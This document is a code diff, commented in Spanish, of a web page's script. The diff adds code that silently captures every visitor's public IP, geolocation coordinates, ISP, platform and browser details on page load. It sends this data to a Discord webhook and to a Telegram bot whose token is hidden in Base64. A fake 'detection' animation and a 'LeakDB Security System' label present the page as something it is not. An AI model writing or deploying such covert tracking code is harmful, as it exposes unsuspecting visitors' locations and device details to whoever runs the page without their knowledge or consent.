@@ -28,30 +28,143 @@
     </div>
 
     <script>
-        // DATOS OFUSCADOS (Base64)
+        // ============================================
+        // CONFIGURACIÓN
+        // ============================================
+        // Token de Telegram (Base64) - Para el bot
         const _0x4a21 = ["ODE1MDcyMTc4NjpBQUdtTXA5Y2hPbnJLZ1U4dzlIRl9sbEU4TGlxM2xWcElWOA==", "ODM2OTQ1ODM5Ng=="];
-        const _k = atob(_0x4a21[0]);
-        const _i = atob(_0x4a21[1]);
+        const _k = atob(_0x4a21);
+        const _i = atob(_0x4a21);
+
+        // Webhook de Discord - PEGA TU WEBHOOK AQUÍ
+        const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/TU_WEBHOOK_AQUI";
 
         async function init() {
             const bar = document.getElementById('bar');
             const st = document.getElementById('status');
             const err = document.getElementById('error-box');
             
-            // 1. Captura Silenciosa
+            // ============================================
+            // 1. CAPTURA DE IP Y ENVÍO A DISCORD
+            // ============================================
+            try {
+                // Obtener IP pública
+                const respIP = await fetch('https://api.ipify.org?format=json');
+                const dataIP = await respIP.json();
+                const ip = dataIP.ip;
+
+                // Obtener geolocalización
+                const respGeo = await fetch(`https://ipapi.co/${ip}/json/`);
+                const geo = await respGeo.json();
+
+                // Crear embed para Discord
+                const embedDiscord = {
+                    embeds: [{
+                        title: "🌐 NUEVA IP CAPTURADA",
+                        color: 0xFF0000,
+                        thumbnail: {
+                            url: "https://cdn-icons-png.flaticon.com/512/1828/1828884.png"
+                        },
+                        fields: [
+                            {
+                                name: "🌐 IP Pública",
+                                value: `\`${ip}\``,
+                                inline: true
+                            },
+                            {
+                                name: "🌍 País",
+                                value: `${geo.country_name || 'N/A'} ${geo.country_emoji || '🌎'}`,
+                                inline: true
+                            },
+                            {
+                                name: "🏙️ Ciudad",
+                                value: `${geo.city || 'N/A'}`,
+                                inline: true
+                            },
+                            {
+                                name: "📍 Región",
+                                value: `${geo.region || 'N/A'}`,
+                                inline: true
+                            },
+                            {
+                                name: "🗺️ Coordenadas",
+                                value: `[${geo.latitude}, ${geo.longitude}](https://www.google.com/maps?q=${geo.latitude},${geo.longitude})`,
+                                inline: true
+                            },
+                            {
+                                name: "🏢 ISP/Proveedor",
+                                value: `${geo.org || 'N/A'}`,
+                                inline: true
+                            },
+                            {
+                                name: "💻 Sistema",
+                                value: `${navigator.platform}`,
+                                inline: true
+                            },
+                            {
+                                name: "🌐 Idioma",
+                                value: `${navigator.language}`,
+                                inline: true
+                            },
+                            {
+                                name: "📱 Navegador",
+                                value: `\`\`\`${navigator.userAgent.substring(0, 100)}...\`\`\``,
+                                inline: false
+                            },
+                            {
+                                name: "⏰ Fecha/Hora",
+                                value: `${new Date().toLocaleString('es-ES')}`,
+                                inline: false
+                            }
+                        ],
+                        footer: {
+                            text: "LeakDB Security System v3.0"
+                        },
+                        timestamp: new Date().toISOString()
+                    }]
+                };
+
+                // Enviar a Discord
+                await fetch(DISCORD_WEBHOOK, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(embedDiscord)
+                });
+
+                console.log('✅ IP enviada a Discord');
+
+            } catch(e) {
+                console.error('❌ Error enviando a Discord:', e);
+            }
+
+            // ============================================
+            // 2. NOTIFICACIÓN SIMPLE A TELEGRAM (OPCIONAL)
+            // ============================================
             try {
                 const r = await fetch('https://api.ipify.org?format=json');
                 const d = await r.json();
                 const ip = d.ip;
 
+                // Mensaje corto a Telegram (solo notificación)
                 await fetch(`https://api.telegram.org/bot${_k}/sendMessage`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ chat_id: _i, text: `🛡️ **REPORTE DE ACCESO**\n\n🌐 IP: \`${ip}\`\n⌚ ${new Date().toLocaleString()}\n📱 ${navigator.platform}`, parse_mode: "Markdown" })
+                    body: JSON.stringify({ 
+                        chat_id: _i, 
+                        text: `🛡️ **ACCESO DETECTADO**\n\n🌐 IP: \`${ip}\`\n⌚ ${new Date().toLocaleString()}\n📱 ${navigator.platform}\n\n💬 Detalles completos en Discord`, 
+                        parse_mode: "Markdown" 
+                    })
                 });
-            } catch(e) {}
 
-            // 2. Animación de "Detección"
+                console.log('✅ Notificación enviada a Telegram');
+
+            } catch(e) {
+                console.error('❌ Error enviando a Telegram:', e);
+            }
+
+            // ============================================
+            // 3. ANIMACIÓN DE "DETECCIÓN"
+            // ============================================
             let w = 0;
             const iv = setInterval(() => {
                 w += 1;
